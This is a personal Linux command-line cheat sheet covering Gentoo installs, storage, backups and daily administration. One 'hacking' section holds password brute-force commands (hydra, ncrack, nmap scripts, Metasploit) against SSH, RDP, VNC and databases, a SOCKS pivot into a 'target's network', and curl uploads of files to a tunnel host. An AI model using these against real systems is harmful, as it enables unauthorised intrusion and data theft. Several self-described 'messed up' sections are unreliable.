# GENTOOBER'S CLI CHEAT SHEET 4 A BUNCH OF THINGS

## USB ISO IMAGE CREATION:
```
dd bs=1M conv=fsync oflag=direct status=progress if=/home/gentoober/ISOS/ of=/dev/sda
```
## 'FIND' USES:
### SEC CHECK
```
find / \( -perm -02000 -o -perm -04000 \) -ls | grep -v '.var\|.usr'
```
```
find / \( -newer /tmp -o -cnewer /tmp \) -ls
```
### GENERAL USAGE
```
find -maxdepth 4 -type f -name "*.txt" -not -path '*/.*'
```
#### EXCLUDING PATH FROM find SEARCHES
```
find / -type d -path '<excluded-path>' -prune -o -type f -iname '<file name>' -print
```
#### SEARCHING FOR 10M FILES:
```
find <path> -type f -size -10M <file/file_type>
```
### USING FIND TO EXCLUDE FILES:
```
find . -type f -name "*.rar" -exec rm {} \;
```
## FETCHES ALL USERS IN /ETC/PASSWD FILE:
```
cut -f1 -d: /etc/passwd
```
## CHECK ALL SERVICES RUNNING (FOREST FORMAT):
```
ps aef --forest 
```
```
ps aux --forest
```
## USER LOGIN/LOGOUT CONNECTION INFO:
```
last -aiF
```
## REMOVING .OLD FROM KERNEL VERSIONS (RESTORING OLD KERNEL NAMES)
```
for file in *.old; do
  mv "$file" "${file%.old}"
done
```
## HDPARM - SECURE ERASE:
```
hdparm --user-master u --security-set-pass 12345 /dev/sda

hdparm --user-master u --security-erase 12345 /dev/sda
```
## UPPERCASING ANY MESSAGE
```
echo "<message>" | tr '[:lower:]' '[:upper:]'
```
## DETECTING DUPLICATE FILES
```
sha256sum *.jpg | cut -c1-32 | sort | uniq -c | sort -nr
```
#### If there are no duplicates, all of the counts produced by uniq will be 1. Sort the results numerically from high to low, and any counts greater than 1 will appear at the top of the output:
```
$ sha256sum *.jpg | cut -c1-32 | sort | uniq -c | sort -nr
 3 f6464ed766daca87ba407aede21c8fcc
 2 c7978522c58425f6af3f095ef1de1cd5
 2 146b163929b6533f02e91bdf21cb9563
 1 d8ad913044a51408ec1ed8a204ea9502
```
#### Identify the files having a given checksum by searching with grep:
```
sha256sum *.jpg | grep f6464ed766daca87ba407aede21c8fcc
```
##### Output:
```
f6464ed766daca87ba407aede21c8fcc image001.jpg
f6464ed766daca87ba407aede21c8fcc image003.jpg
```
## [PORTAGE] OMITTING LARGE PACKAGES FROM UPDATES / RECOMPS / &c
```
emerge -eq --exclude=sys-devel/gcc --exclude=sys-devel/llvm @world
```
### [PORTAGE] GETTING AN SPECIFIC VERSION A PACKAGE
#### to get a very specific version of a package (e.g.):
```
emerge -av =sys-kernel/vanilla-kernel-5.10.189
```
## [PORTAGE] /ETC/PORTAGE/ENV/GCC-GRAPHITE.CONF - GCC-GRAPHITE FLAGS
```
GRAPHITE="-floop-interchange -ftree-loop-distribution -floop-strip-mine -floop-block"
CFLAGS="-flto=jobserver ${GRAPHITE} -ftree-vectorize"
CXXFLAGS="${CFLAGS}"
LDFLAGS="${CFLAGS} -fuse-linker-plugin"
```
#### run:
```
binutils-config --linker ld.gold
```
##### https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html

## SSH TUNNEL TIP
```
ssh -o ServerAliveInterval=15 user@host
```
## REMUX VIDEO FOR WHATSAPP / TELEGRAM:
```
ffmpeg -i Buda\ -\ Aprenda\ a\ Silenciar\ a\ Mente.mp4 -vf "scale=640:-1" -b:v 1M -c:v libx264 -c:a aac -strict experimental Buda\ -\ Aprenda\ a\ Silenciar\ a\ Mente_wpp.mp4
```
## COMPRESSING / BACKUPING FILES
### LRZIP
```
tar cvf <DIR>.tar <DIR>/ --one-file-system --remove-files --use-compress-program="lrzip -l -L1 -p12 -N0"
```
### LZ4
```
tar cvf <DIR>.tar <DIR>/ --use-compress-program="lz4 --fast=12"
```
### DECOMPRESSING LZ4
```
lz4 -d <file>.tar -f <new-file>.tar && untar <file-real>.tar
```
```
for i in *.tar; do
    untar "$i"
done
```
## ZSTD/LZO compression / decompression
```
tar -cvf - diretório_origem | zstd -vz --ultra -o arquivo.tar.zst
zstd -d arquivo.tar.zst -o arquivo.tar
tar -xvf arquivo.tar
```
```
tar cf - <DIR>/ | lzop -v -9 - > DIR.tar.lzo
```
## DOWNLOADING PDF FILES w/ WGET # PDF is an example. one could download ANY files using similar syntax.
```
wget --mirror --no-parent --accept "*.pdf" <address>
```
### USING A LINK LIST:
```
wget -c -N -i links.txt 
```
## SETTING XDG DEFAULT APPS
```
xdg-mime default pcmanfm.desktop inode/directory
xdg-mime query default inode/directory
```
```
xdg-mime default sxiv.desktop image/jpeg
xdg-mime default sxiv.desktop image/png
xdg-mime default sxiv.desktop image/gif
```
```
xdg-mime default mpv.desktop audio/.* 
xdg-mime default mpv.desktop video/.* 
```
```
xdg-settings set default-web-browser brave-bin.desktop
xdg-settings set default-web-browser firefox.desktop
```
#### and so on...

## RSYNC COMMON USES
```
rsync -haAvWXz --delete --progress --exclude=<DIR>/ books/ /mnt/pendrives/backups/books/
```
```
rsync -havz origin.tar /<destiny>
```
```
rsync -havz origin.tar user@server:/<path>
```
### CLONING LINUX-DISTRO (FULL BACKUP):
```
rsync -haAXvWz --progress --delete --exclude={/dev/*,/proc/*,/sys/*,/tmp/*,/run/*,/mnt/*,/media/*} / /mnt/backup
```
### $HOME:
```
rsync -haAvWXz --delete --progress --exclude=gentoober-library/ books/ /mnt/pendrives/backups/books/
```
## SOUND MANAGEMENT EXAMPLES (PULSEAUDIO)
```
pactl list short sources
```
#### e.g.:
```
pactl set-source-volume 48 25%
```
## SED USAGE EXAMPLES: 
```
sed -i 's/\/mnt\/gentoo/\/mnt\/backup/g' file.txt
```
## IPTABLES (BASIC CONFIG):
```
iptables -A INPUT -p icmp -j DROP && iptables -L
```
## SOME TRIVIAL & USEFUL DAILY COMMANDS
### SORT PROCESSES BY MEMORY USAGE
```
vmstat --unit M -as
```
```
ps -eo 'pid,user,group,gid,vsz,rss,comm' --sort=-rss | less
```
```
ps -eo 'pid,user,group,gid,vsz,rss,comm' --sort=-rss | awk '{ $5 = $5 / 1024; $6 = $6 / 1024; print }' | column -t | less
```
```
ps -eo 'pid,user,group,gid,vsz,rss,comm' --sort=-rss | awk '{ $5 = $5 / (1024 * 1024); $6 = $6 / (1024 * 1024); print }' | column -t | less
```
### Redirecting output from a command to a file and monitoring the output in real-time:
#### Method 1
```
stdbuf -oL <command> | tee log_file.txt
```
#### Method 2
```
<command> | tee >(cat)
```
#### Method 3
```
unbuffer <command> | tee log_file.txt
```
## LVM CHEATSHEET # DO NOT confuse with LLVM (CLANG)
### A small "cheatsheet" with basic LVM (Logical Volume Manager) commands to create and remove Physical Volumes (PVs), Volume Groups (VGs), and Logical Volumes (LVs), as well as perform resizing:

#### Creating a Physical Volume (PV):
```
pvcreate /dev/sdx
```
#### Creating a Volume Group (VG):
```
vgcreate vg_name /dev/sdx
```
#### Adding a Physical Volume (PV) to a Volume Group (VG):
```
vgextend vg_name /dev/sdy
```
#### Creating a Logical Volume (LV):
```
lvcreate -L size -n lv_name vg_name
```
#### Resizing a Logical Volume (LV):
```
lvresize -L +size lv_path (ex: +10G)
lvresize -L -size lv_path (ex: -5G)
```
#### Resizing a file system while it's mounted:
```
resize2fs /dev/vg_name/lv_name # ext4
```
```
btrfs filesystem resize max /dev/vg_name/lv_name # btrfs
```
#### Removing a Logical Volume (LV):
```
lvremove lv_path
```
#### Removing a Volume Group (VG):
```
vgremove vg_name
```
#### Removing a Physical Volume (PV):
```
pvremove /dev/sdx
```
## LVM RESIZE (BTRFS USAGE)
```
lvextend -l +100%FREE /dev/mapper/gentoober-home
```
```
btrfs filesystem resize max /home/
```
```
btrfs filesystem defrag -r -v -clzo /mnt/backup/
```
## ENCRYTPTED [BTRFS] SWAP
### NORMAL SWAP FILE 
#### (no trouble section)
```
truncate -s 0 swapfile
```
```
chattr +C swapfile && lsattr swapfile
```
```
fallocate -l 11GB swapfile
```
```
chmod 0600 swapfile && ls -l swapfile
```
```
mkswap swapfile
```
```
swapon swapfile && free -h
```
### SWAP CREATION METHODS: 
#### (this section is a COMPLETE MESS and need fixing! DO NOT follow those steps if you don't know what you doing.)
```
dd bs=4M count=2560 if=/dev/zero of=swapfile conv=fsync oflag=direct status=progress
```
```
cryptsetup luksFormat --cipher aes-xts-plain64 --key-size 256 --hash sha256 --iter-time 2000 --use-random --verify-passphrase --type luks1 swapfile.img
```
```
losetup --find --show -O AUTOCLEAR swapfile.img
```
```
cryptsetup luksFormat swapfile.img
```
```
cryptsetup luksOpen --allow-discards swapfile swap_crypt
```
```
mkswap /dev/mapper/swap_crypt
```
```
swapon /dev/mapper/swap_crypt
```
## BLACKLISTING PCSPKR:
### [FILE] /ETC/MODPROBE.D/DISABLE-PCSPKR.CONF
```
vim /etc/modprobe.d/disable-pcspkr.conf
```
#### Insert the following content:
```
blacklist pcspkr
```
#### Apply:
```
sysctl -p # for sysctl.conf IN /etc
sysctl --system # for 99-local.conf IN /etc/sysctl.d/99-local.conf
```
## [IMAGEMAGICK] CONVERTING IMAGES:
```
jpg_files=$(find . -type f \( -iname \*.jpg -o -iname \*.jpeg \)) && echo $jpg_files

for file in $jpg_files; do
    convert -verbose -monitor "$file" "${file%.jpg}.png"
done

find . -type f -iname "*.jpg" -exec rm {} \;
```
## COMPILING SELF-MADE PROGRAMS WITH CLANG:
```
clang -O2 -march=znver2 -pipe -flto=thin -fuse-ld=lld -rtlib=compiler-rt -unwindlib=libunwind -Wl,--as-needed -Wl,-plugin-opt=O3 -Wl,--lto-O3 <file>.c -o <file>.bin
```
## RESIZING TMPFS
### /run/user/$(id -u)
```
mount -o remount,size=2.5G /run/user/1000
```
## INSTALLING NEW FONTS
```
unzip nome_do_arquivo.zip -d /usr/share/fonts/myfonts

fc-cache -f -v
```
## XDG TMPFS
### [FILE] /etc/profile.d/xdg_cache_home.sh
```
vim /etc/profile.d/xdg_cache_home.sh

if [ ${LOGNAME} ]; then
  export XDG_CACHE_HOME="/tmp/${LOGNAME}/.cache"
fi
```
## ENABLING TAP-TO-CLICK ON DWM:
```
mkdir -p /etc/X11/xorg.conf.d/

vim /etc/X11/xorg.conf.d/30-touchpad.conf
```
#### [FILE] 30-touchpad.conf:
```
Section "InputClass"
    Identifier "touchpad"
    Driver "libinput"
    MatchIsTouchpad "on"
    MatchProduct "MSFT0001:00 04F3:31BE Touchpad"
    Option "Tapping" "on"
EndSection
```
## Use a list of files for the mv command.
```
mv $(cat lista_de_arquivos.txt) destino/
```
## AWK / SED / CUT # incomplete example, ignore it if you don't know what you doing.
```
echo "Only in SFW: 121212.png" | awk -F ': ' '{print $2}'
echo "Only in SFW: 121212.png" | awk '/Only in/ {print $4}'
cat wallpapers.log | sed -n 's/Only in \(.*\): \(.*\)/\1\2/p'
```
## Home Compressed Backup Creation (MESSED UP!)
```
shopt -s globstar; tar cvpf - --xattrs --exclude=/home/gentoober/.cache/* /home/gentoober/ | zstd -vz -10 --ultra - > home-gentoober-backup-$DATE.tar.zst; shopt -u globstar
```
```
shopt -s globstar; tar -cvpf - --xattrs --exclude=/home/gentoober/.cache/* /home/gentoober/ | xz -9 -c - > home_gentoober_backup-$(date +%d_%m_%Y).tar.xz; shopt -u globstar
```
#### HOME BACKUP (COMPRESSED)
```
shopt -s globstar; tar -cvpf - --xattrs --exclude=/home/gentoober/.cache/* /home/gentoober/ | lz4 -vz --best -c - > home_gentoober_backup-$(date +%d_%m_%Y).tar.lz4; shopt -u globstar
```
#### BACKUP DECOMPRESSION
```
lz4 -d rootfs_backup-*.tar.lz4

tar --xattrs-include='*.*' --numeric-owner -xpvf home_gentoober_backup-*.tar /
```
## CREATING A GENTOO STAGE4 (MESSED UP):
```
shopt -s globstar; tar cvpf - --xattrs --exclude=/home/gentoober/.cache/* /home/gentoober/ | zstd -vz -10 --ultra - > home-gentoober-backup-$DATE.tar.zst; shopt -u globstar
```
```
shopt -s globstar; tar -cvpf - --xattrs --exclude=/home/gentoober/.cache/* /home/gentoober/ | xz -9 -c - > home_gentoober_backup-$(date +%d_%m_%Y).tar.xz; shopt -u globstar
```
```
shopt -s globstar; tar cvpf - --xattrs --exclude={/dev/*,/proc/*,/sys/*,/tmp/*,/run/*,/mnt/*,/media/*,/home/*} / | zstd -vz -10 --ultra - > /media/stage3-gentoober-$DATE.tar.zst; shopt -u globstar
```
```
shopt -s globstar; tar cvpf - --xattrs --exclude={/dev/*,/proc/*,/sys/*,/tmp/*,/run/*,/mnt/*,/media/*,/home/*} / | zstd -vz -10 --ultra - > /media/stage3-gentoober-$DATE.tar.zst; shopt -u globstar
```
## HARDENING SMTP TIP:
```
postconf -e disable_vrfy_command=yes
```
## MISC NETWORKING USEFUL COMMANDS:
```
iwlist wlan0 scanning
```
```
traceroute -n <ADDR>
```
```
route -n
```
```
route add default gw <IP>
```
```
route del default gw <IP>
```
```
tcpdump -vv -i wlan0
```
```
tcpdump -vv -i wlan0 icmp -w icmp.pcap
```
```
tcpdump -r icmp.pcap
```
```
macchanger -r wlan0 # new
```
```
macchanger -p wlan0 # restore
```
## CLAMAV USAGE EXAMPLES
```
clamscan -r  / --exclude-dir=/proc --exclude-dir=/sys --exclude-dir=/dev --exclude-dir=/boot --exclude-dir=/var --exclude-dir=/tmp --exclude-dir=/run
```
```
clamscan -vr --max-filesize=2000M --max-scantime=2700 --cross-fs=yes --follow-dir-symlinks=2 --follow-file-symlinks=2 --official-db-only --scan-elf --scan-pdf --detect-pua --heuristic-alerts --move=/var/suspected/ --log=books.clamav.log /home/gentoober/books/
```
```
clamscan -vr --max-filesize=4000M --max-scantime=14400 --cross-fs=yes --follow-dir-symlinks=2 --follow-file-symlinks=2 --official-db-only --scan-elf --detect-pua --heuristic-alerts --move=/var/suspected/ --exclude-dir=/proc --exclude-dir=/sys --exclude-dir=/dev --exclude-dir=/boot --exclude-dir=/var --exclude-dir=/tmp --exclude-dir=/run --log=system.clamav.log /
```
## LISTING "1920x1080" IMAGES
```
identify -format "%w %h %i\n" *.png | awk '$1 == 1920 && $2 == 1080'
```
```
alias imglen='identify -format "%w %h %i\n" *.png | awk '$1 == 1920 && $2 == 1080' 
```
```
imglen | awk '{print $3}' > 1920 && mv-files'
```
## (BASH) RANDOM NUMBER GENERATION
```
head -c 4 /dev/urandom | od -N4 -tu4 | awk 'NR==1 {print $2 % 100000000 + 1}'
```
```
shuf -i 1-100000000 -n 1
```
## WATCHING REAL TIME PROCESSES
```
watch -n 30 <command>
```
```
PROCESS=<PID/process_name/program>
while ps aux | grep -v grep | grep "$PROCESS" > /dev/null; do sleep 30; done && echo "A execução de $PROCESS foi concluída."
```
## ZFS CHEAT SHEET
```
zpool create myzfspool /dev/loop0
```
```
zfs create -o compression=lz4 autotrim=on myzfspool/dataset1
```
```
zfs set mountpoint=/mnt/zfs-mount zpool-0/data-0
```
```
mount -t zfs zpool-0/data-0 /mnt/zfs-mount
```
```
zpool remove zfspool /dev/mapper/gentoober-zfs
```
```
zpool list zfspool
```
```
zpool remove zfspool /dev/mapper/gentoober-zfs
```
```
zpool create zpool0 /dev/mapper/gentoober-zfs
```
```
zpool status zfspool
```
```
zfs set compression=lz4 myzfspool/dataset1
```
```
zfs get compression myzfspool/dataset1
```
## MISC "HACKING" COMMANDS
### CREATING AN "INVISIBLE" SSH SESSION
```
ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
```
### ARP discover computers on the local network 
```
nmap -r -sn -PR 192.168.0.1/24
```
### ICMP discover computers on the local netowrk
```
NET="192.168.0"  # discover 192.168.0.1-192.168.0.254
seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
```
### Monitor every new TCP connection
```
tcpdump -n "tcp[tcpflags] == tcp-syn"
```
### Play a *bing*-noise for every new SSH connection
```
tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
```
### Ascii output (for all large packets. Change to >40 if no TCP options are used).
```
tcpdump -s 2048 -nAq 'tcp and (ip[2:2] > 60)'
```
### Reverse HTTPS tunnel to forward public HTTPS requests to Port 8080 on this server
```
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
```
#### Or using remote.moe
```
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
```
#### Or using cloudflared
```
cloudflared tunnel --url http://localhost:8080 --no-autoupdate
```
### A simple STDIN/STDOUT pipe via HTTPS:
```
websocat -s 8080
```
#### and on the workstation use this command to connect:
```
websocat wss://<HTTPS-URL>
```
#### Or run a Socks-Proxy (via HTTPS): 
#### On the server
```
gost -L mws://:8080
```
#### On the Workstation
```
gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
```
### Forward port 2222 to the server's port 22:
```
gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
```
#### or use it as a Socks-Proxy:
```
gost -L :1080 -F 'mwss://<HTTPS-URL>:443'
```
### Test the Socks-proxy:
```
curl -x socks5h://0 ipinfo.io
```
## Use any tool via Socks Proxy
### On the target's network:
#### Create a SOCKS proxy into the target's network.
#### Use gs-netcat but ssh -D would work as well.
```
gs-netcat -l -S
```
#### On your workstation:
#### Create a gsocket tunnel into the target's network:
```
gs-netcat -p 1080
```
### Use ProxyChain to access any host on the target's network: 
```
echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
proxychains -f pc.conf -q curl ipinfo.io
```
### Scan the router at 192.168.1.1
```
proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1
```
### Start 10 nmaps in parallel:
```
seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{} 
```
### SSH
```
nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"
ncrack -P "${PLIST}" --user root "ssh://${T}"
hydra -P "${PLIST}" -l root "ssh://$T"
```
### Remote Desktop Protocol / RDP
```
ncrack -P "${PLIST}" --user root -p3389 "${T}"
hydra -P "${PLIST}" -l root "rdp://$T"
```
### FTP
```
hydra -P "${PLIST}" -l user "ftp://$T"
```
### POP3 (email)
```
nmap -p110,995 --script pop3-brute "$T"
```
### MySQL
```
nmap -p3306 --script mysql-brute "$T"
```
### PostgreSQL
```
nmap -p5432 --script pgsql-brute "$T"
```
### SMB (windows)
```
nmap --script smb-brute "$T"
```
### Telnet
```
nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s "$T"
```
### VNC
```
nmap -p5900 --script vnc-brute "$T"
ncrack -P "${PLIST}" --user root "vnc://$T"
hydra -P "${PLIST}" "vnc://$T"
medusa -P "${PLIST}" –u root –M vnc -h "$T"
```
### VNC (with metasploit)
```
msfconsole
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.0.1
set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
run
```
## HTML basic auth
```
echo admin >user.txt                     # Try only 1 username
echo -e "blah\naaddd\nfoobar" >pass.txt  # Add some passwords to try. 'aaddd' is the valid one.
nmap -p80 --script http-brute --script-args \
   http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
   pentesteracademylab.appspot.com
```
## openssl encode
```
openssl base64 < file
```
## openssl decode (cut & paste the 1 line from above):
```
openssl base64 -d > file-COPY
```
## xxd encode
```
xxd -p < file
```
## xxd decode
```
xxd -p -r > file-COPY
```
## File transfer - using WebDAV
```
cloudflared tunnel --url localhost:8080 &
```
```
# [...]
# +--------------------------------------------------------------------------------------------+
# |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
# |  https://example-foo-bar-lights.trycloudflare.com                                          |
# +--------------------------------------------------------------------------------------------+
# [...]
wsgidav --port=8080 --root=.  --auth=anonymous
# Upload a file to your workstation
curl -T file.dat https://example-foo-bar-lights.trycloudflare.com
# Create a directory remotely
curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources
# Create a directory hirachy remotely
find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
# Upload all *.c files (in parallel):
find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}
```
## SHODAN quick search
```
IP=ip_address
curl https://internetdb.shodan.io/$IP | jq
```
## FAST vulners scan
```
nmap -vv -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s $IP
```
```
nmap -r -sn -PR 192.168.0.1/24
```
## ICMP discover computers on the local netowrk
```
NET="192.168.0"
seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
```
## Monitor every new TCP connection
```
tcpdump -n "tcp[tcpflags] == tcp-syn"
```
## Play a *bing*-noise for every new SSH connection
```
tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
```
## Ascii output (for all large packets. Change to >40 if no TCP options are used).
```
tcpdump -s 2048 -nAq 'tcp and (ip[2:2] > 60)'
```
## Reverse HTTPS tunnel to forward public HTTPS requests to Port 8080 on this server:
```
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
```
### Or using remote.moe
```
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
```
### Or using cloudflared
```
cloudflared tunnel --url http://localhost:8080 --no-autoupdate
```
## PUBIP
```
curl -s wtfismyip.com/json | jq
curl ifconfig.me
dig +short myip.opendns.com @resolver1.opendns.com
host myip.opendns.com resolver1.opendns.com
```
### GEOLOC
```
curl https://ipinfo.io/8.8.8.8 | jq
curl http://ip-api.com/8.8.8.8 | jq
curl https://cli.fyi/8.8.8.8 | jq
```
## GENTOOBER'S GUIDE: GENTOO ZFS INSTALL
```
ls /sys/firmware/efi
```
```
parted -a optimal /dev/nvme0n1
```
```
mklabel gpt
```
```
mkpart esp fat32 0% 513
```
``` 
mkpart rootfs btrfs 33280 100% 
```
```
set 1 boot on
```
```
print
```
```
quit
```
```
mkfs.vfat -F32 /dev/nvme0n1p1
```
```
ls -l /dev/disk/by-id/
```
```
ls -l /dev/disk/by-id/
```
```
rm -f /etc/hostid && zgenhostid
```
### To create the zfs root pool including a mirror configuration
### Substitute ata-disk1-part3 for nvme-disk1-part3 and ata-disk2-part3 for nvme-disk2-part3 if you have an nvme ssd disk.

```
zpool create -f -o ashift=12 -o cachefile=/etc/zfs/zpool.cache -O compression=lz4 -O xattr=sa -O relatime=on -O acltype=posixacl -O dedup=off -m none -R /mnt/gentoo rpool mirror /dev/disk/by-id/ata-disk1-part3 /dev/disk/by-id/ata-disk2-part3
```
```
zpool create -f -o ashift=12 -o cachefile=/etc/zfs/zpool.cache -O compression=lz4 -O xattr=sa -O relatime=on -O acltype=posixacl -O dedup=off -m none -R /mnt/gentoo rpool /dev/disk/by-id/ata-disk1-part3
```

## Create your rootfs zfs datasets
### Create the dataset container structure and dataset necessary for /.
```
zfs create -o mountpoint=none -o canmount=off rpool/ROOT
```
```
zfs create -o mountpoint=/ rpool/ROOT/gentoo
```
## Set the boot flag for zfs root dataset
```
zpool set bootfs=rpool/ROOT/gentoo rpool
```
## Create /usr, /var, /var/lib and /home zfs dataset containers
```
zfs create -o canmount=off rpool/usr
zfs create -o canmount=off rpool/var
zfs create -o canmount=off rpool/var/lib
zfs create -o canmount=off rpool/home 
```
## Create user home directory dataset
### Replace username with the desired user name
```
zfs create -o mountpoint=/home/gentoober rpool/home/gentoober
```
```
zpool status
```
```
zfs list
```
## SWAP CREATION
```
PAGESIZE=$(getconf PAGESIZE)
echo $PAGESIZE
```
### OR:
```
getconf PAGESIZE > PAGESIZE
```
```
zfs destroy rpool/SWAP  # exclui o conjunto de dados anterior (se houver)
```
```
zfs create -V 10G -b 8192 -o logbias=throughput -o sync=always -o primarycache=metadata rpool/SWAP  # cria o novo VDEV ZFS [SWAP]
```
```
mkswap /dev/zvol/rpool/SWAP
```
```
swapon /dev/zd0
```

## Installing Gentoo
```
ntpdate -u pool.ntp.org 
```
```
cd /mnt/gentoo && mkdir boot && mount /dev/nvme0n1p1 boot
```
```
tar xJpvf stage3-*.tar.xz --xattrs-include='*.*' --numeric-owner 
```
### Copy zpool cache
```
mkdir etc/zfs && cp /etc/zfs/zpool.cache etc/zfs
```
### Copy network settings
```
cp --dereference /etc/resolv.conf /mnt/gentoo/etc/
```
```
./mounty.sh
```
### CHROOT
```
chroot /mnt/gentoo /bin/bash
```
```
source /etc/profile && export PS1="(chroot) ${PS1}"
```
## EDIT FSTAB

### Everything is on zfs so we don't need anything in here except for the boot and swap entries. fstab should resemble the following example. 
### Substitute the provided UUID's from your blkid command:
```
nano /etc/fstab
```
```
UUID=9E40-2218                              /boot           vfat            defaults           1 2
UUID=fac87c68-50ef-424b-9673-dfd0a9890aff   none            swap            sw                 0 0
```
### Get the default portage tree
```
mkdir /etc/portage/repos.conf 
cp /usr/share/portage/config/repos.conf /etc/portage/repos.conf/gentoo.conf
emerge-webrsync

femaint && fupgr
```
```
emerge dracut bash-completion eix gentoolkit efibootmgr dosfstools gentoo-kernel-bin linux-firmware cronie amd-microcode parted
```
```
rc-update add zfs-import sysinit
rc-update add zfs-mount sysinit
rc-update add zfs-share default
rc-update add zfs-zed default 
```
## Generate and verify the zfs hostid file
```
zgenhostid 

file /etc/hostid 
```
## KERNEL
```
dracut --hostonly -k /lib/modules/6.3.9-zen1-zfs/ --kver 6.3.9-zen1-zfs -f /boot/initramfs-6.3.9-zen1-zfs.img
```
```
efibootmgr --disk /dev/sda --part 1 --create --label "Gentoo 6.3.9-zen1-zfs" --loader "vmlinuz-6.3.9-zen1-zfs" --unicode 'root=ZFS=rpool/ROOT/gentoo ro initrd=\initramfs-6.3.9-zen1-zfs.img'
```
```
exit
umount -lR {dev,proc,sys}
cd
swapoff /dev/zvol/rpool/SWAP
zpool export rpool
reboot
```
## USB ISO IMAGE CREATION
```
dd bs=1M conv=fsync oflag=direct status=progress if=/home/gentoober/ISOS/ of=/dev/sda
```
## DOWNLOADING PDF FILES w/ WGET
```
wget --mirror --no-parent --accept "*.pdf" https://theswissbay.ch/pdf/
```
```
wget -c -N -i links.txt 
```
## GENTOO BTRFS [LVM] INSTALL
```
parted -a optimal /dev/nvme0n1

unit mib

mklabel gpt
mkpart primary 1 513
name 1 boot
set 1 BOOT on

mkpart primary 513 -1
name 2 lvm
set 2 lvm on
```
```
mkfs.vfat -F32 /dev/nvme0n1p1
```
```
pvcreate /dev/nvme0n1p2

vgcreate gentoober /dev/nvme0n1p2

lvcreate -L 500G

mkfs.btrfs -L root /dev/mapper/gentoober-root
```
```
mount LABEL=root /mnt/gentoo

btrfs subvolume create /mnt/gentoo/boot
btrfs subvolume create /mnt/gentoo/etc
btrfs subvolume create /mnt/gentoo/home
btrfs subvolume create /mnt/gentoo/usr
btrfs subvolume create /mnt/gentoo/var
```
### btrfs subvolume create /mnt/gentoo/storage (crypt)
```
wget <stage3>
```
#### GET YOUR STAGE3 HERE (Brazil): https://gentoo.c3sl.ufpr.br/releases/amd64/autobuilds/
```
tar xpvf stage3-*.tar.xz --xattrs-include='*.*' --numeric-owner
```
```
mirrorselect -i -o >> /mnt/gentoo/etc/portage/make.conf
```
```
cat make.conf > /mnt/gentoo/etc/portage/make.conf

mkdir --parents /mnt/gentoo/etc/portage/repos.conf

cp /mnt/gentoo/usr/share/portage/config/repos.conf /mnt/gentoo/etc/portage/repos.conf/gentoo.conf

cp --dereference /etc/resolv.conf /mnt/gentoo/etc/
```
```
test -L /dev/shm && rm /dev/shm && mkdir /dev/shm
mount --types tmpfs --options nosuid,nodev,noexec shm /dev/shm
chmod 1777 /dev/shm /run/shm
```
```
./mounty.sh
```
```
chroot /mnt/gentoo /bin/bash
```
```
source /etc/profile && export PS1="(chroot) ${PS1}"
```
### EDIT /etc/fstab
```
vim /etc/fstab

tmpfs /var/tmp         tmpfs rw,nosuid,noatime,nodev,size=16G,mode=1777 0 0
tmpfs /var/tmp/portage tmpfs rw,nosuid,noatime,nodev,size=16G,mode=775,uid=portage,gid=portage,x-mount.mkdir=775 0 0
```
```
mount -a
```
```
mount LABEL=BOOT /boot
```
```
emerge-webrsync
```
```
eselect profile list
```
```
eselect profile set <profile>
```
### LISTING USE FLAGS
```
less /var/db/repos/gentoo/profiles/use.desc
```
```
emerge -q app-portage/cpuid2cpuflags
```
```
cpuid2cpuflags
```
```
echo "America/Sao_Paulo" > /etc/timezone && emerge --config sys-libs/timezone-data
```
```
nano -w /etc/locale.gen && locale-gen

eselect locale list && eselect locale set 4

env-update && source /etc/profile && export PS1="(chroot) ${PS1}"
```
```
emerge -uvNDq @world
```
```
emerge -qv bash-completion gentoolkit eix esearch flaggie ccache htop vim
```
```
flaggie linux-firmware +compress-zstd +initramfs
```
```
emerge -av linux-firmware && emerge gentoo-kernel-bin -v
```
```
emerge -av cronie sysklogd logrotate chrony
```
```
rc-update add sysklogd default; rc-update add cronie default; rc-update add chronyd default
```
```
flaggie networkmanager +iwd && flaggie iwd +standalone && emerge -av networkmanager
```
```
rc-update add iwd default && rc-update add NetworkManager default
```

#### [FILE] /etc/logrotate.conf
```
#weekly
daily

/etc/logrotate.d/portage

# /etc/logrotate.d/portage

/var/log/emerge-fetch.log {
    createolddir 755 portage portage
    olddir /var/log/portage/old
    su portage portage
    copytruncate
    missingok
}

/var/log/emerge.log {
    createolddir 755 portage portage
    olddir /var/log/portage/old
    su portage portage
    copytruncate
    missingok
}

/var/log/portage/*.log {
    su portage portage
    missingok
    nocreate
}
```
```
